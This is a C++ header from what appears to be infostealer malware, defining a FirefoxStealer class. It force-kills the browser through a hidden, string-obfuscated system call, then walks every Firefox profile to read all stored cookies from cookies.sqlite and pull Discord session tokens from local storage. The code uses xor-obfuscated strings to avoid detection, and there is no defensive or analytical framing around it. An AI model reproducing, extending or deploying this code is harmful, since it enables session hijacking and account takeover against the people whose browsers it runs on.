#pragma once
#include "../result.hpp"
#include "base.hpp"
#include "pch.hpp"
#include "util.hpp"
#include <sqlite3.h>
#include <wolfssl/wolfcrypt/aes.h>
#include <wolfssl/wolfcrypt/pkcs11.h>

class FirefoxStealer : public AbstractStealer {
public:
  FirefoxStealer(std::string executable, std::filesystem::path path) : path(path) { hidden_system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str()); }

  inline void steal() override {
    PRINTF("FirefoxStealer::steal()\n");

    for (std::filesystem::directory_entry entry : std::filesystem::directory_iterator(path / "Profiles")) {
      if (!entry.is_directory())
        continue;

      std::filesystem::path profile_path = entry.path();
      PRINTF("Profile: %s\n", profile_path.string().c_str());

      std::filesystem::path cookies_path = profile_path / xor("cookies.sqlite");
      if (!std::filesystem::exists(cookies_path))
        continue;

      PRINTF("Cookies\n");
      {
        sqlite3 *db;
        if (sqlite3_open(cookies_path.string().c_str(), &db) != SQLITE_OK)
          continue;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db, xor("SELECT host, name, value FROM moz_cookies"), -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
          Cookie cookie;
          cookie.host = (const char *)sqlite3_column_text(stmt, 0);
          cookie.name = (const char *)sqlite3_column_text(stmt, 1);
          cookie.value = (const char *)sqlite3_column_text(stmt, 2);
          cookies.push_back(cookie);
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
      }

      PRINTF("Discord Tokens\n");
      do {
        std::filesystem::path storage_path = profile_path / "storage" / "default" / xor("https+++discord.com") / "ls" / "data.sqlite";
        if (!std::filesystem::exists(storage_path))
          break;

        sqlite3 *db;
        if (sqlite3_open(storage_path.string().c_str(), &db) != SQLITE_OK)
          break;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db, xor("SELECT value FROM data WHERE key = 'token'"), -1, &stmt, nullptr);
        if (sqlite3_step(stmt) == SQLITE_ROW) {
          std::string token = (const char *)sqlite3_column_text(stmt, 0);
          append_discord_token(token.substr(1, token.size() - 2));
        }
      } while (false);
    }
  }

private:
  std::filesystem::path path;
};